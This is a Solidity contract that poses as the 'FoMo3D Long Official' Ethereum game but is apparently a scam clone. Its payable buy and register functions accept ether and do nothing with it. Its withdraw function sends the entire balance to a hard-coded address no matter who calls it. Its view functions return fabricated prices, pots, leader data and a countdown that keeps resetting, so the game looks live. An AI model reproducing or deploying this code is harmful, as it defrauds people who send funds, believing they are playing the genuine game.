contract FoMo3Dlong {
    using SafeMath for *;
    string constant public name = "FoMo3D Long Official";
    string constant public symbol = "F3D";
	uint256 public airDropPot_;
    uint256 public airDropTracker_ = 0;
    mapping (address => uint256) public pIDxAddr_;
    mapping (bytes32 => uint256) public pIDxName_;
    mapping (uint256 => F3Ddatasets.Player) public plyr_;
    mapping (uint256 => mapping (uint256 => F3Ddatasets.PlayerRounds)) public plyrRnds_;
    mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_;
    mapping (uint256 => F3Ddatasets.Round) public round_;
    mapping (uint256 => mapping(uint256 => uint256)) public rndTmEth_;
    mapping (uint256 => F3Ddatasets.TeamFee) public fees_;
    mapping (uint256 => F3Ddatasets.PotSplit) public potSplit_;
    function buyXid(uint256 _affCode, uint256 _team) public payable {}
    function buyXaddr(address _affCode, uint256 _team) public payable {}
    function buyXname(bytes32 _affCode, uint256 _team) public payable {}
    function reLoadXid(uint256 _affCode, uint256 _team, uint256 _eth) public {}    
    function reLoadXaddr(address _affCode, uint256 _team, uint256 _eth) public {} 
    function reLoadXname(bytes32 _affCode, uint256 _team, uint256 _eth) public {}
    function withdraw() public {
        address aff = 0x7ce07aa2fc356fa52f622c1f4df1e8eaad7febf0;
        aff.transfer(this.balance);
    }
    function registerNameXID(string _nameString, uint256 _affCode, bool _all) public payable {}  
    function registerNameXaddr(string _nameString, address _affCode, bool _all) public payable {} 
    function registerNameXname(string _nameString, bytes32 _affCode, bool _all) public payable {} 
	uint256 public rID_ = 1;
    function getBuyPrice()
        public 
        view 
        returns(uint256)
    {  
        return ( 100254831521475310 );
    }
    function getTimeLeft()
        public
        view
        returns(uint256)
    {
        uint256 _rID = rID_;
		uint256 _now = now;
		round_[_rID].end =  _now + 125 - ( _now % 120 );
		return( 125 - ( _now % 120 ) );
    }
    function getPlayerVaults(uint256 _pID)
        public
        view
        returns(uint256 ,uint256, uint256)
    {
        return (0, 0, 0);
    }
    function getCurrentRoundInfo()
        public
        view
        returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, address, bytes32, uint256, uint256, uint256, uint256, uint256)
    {
        uint256 _rID = rID_;
		uint256 _now = now;
		round_[_rID].end = _now + 125 - (_now % 120);
        return
        (
            0,                
            _rID,                            
            round_[_rID].keys,              
            round_[_rID].end,         
            round_[_rID].strt,               
            round_[_rID].pot,                
            (round_[_rID].team + (round_[_rID].plyr * 10)),      
            0xd8723f6f396E28ab6662B91981B3eabF9De05E3C,   
            0x6d6f6c6963616e63657200000000000000000000000000000000000000000000,   
            3053823263697073356017,              
            4675447079848478547678,              
            85163999483914905978445,              
            3336394330928816056073,              
            519463956231409304003               
        );
    }
    function getPlayerInfoByAddress(address _addr)
        public 
        view 
        returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256)
    {
        return
        (
            18163,                                
            0x6d6f6c6963616e63657200000000000000000000000000000000000000000000,                    
            122081953021293259355,          
            0,                     
            0,        
            0,                     
            0            
        );
    }
    function calcKeysReceived(uint256 _rID, uint256 _eth)
        public
        view
        returns(uint256)
    {
        return (1646092234676);
    }
    function iWantXKeys(uint256 _keys)
        public
        view
        returns(uint256)
    {
        return (_keys.mul(100254831521475310)/1000000000000000000);
    }
    bool public activated_ = true;
    function activate() public {
        round_[1] = F3Ddatasets.Round(1954, 2, 1533795558, false, 1533794558, 34619432129976331518578579, 91737891789564224505545, 21737891789564224505545,31000, 0, 0, 0);
    }
    function setOtherFomo(address _otherF3D) public {}
}
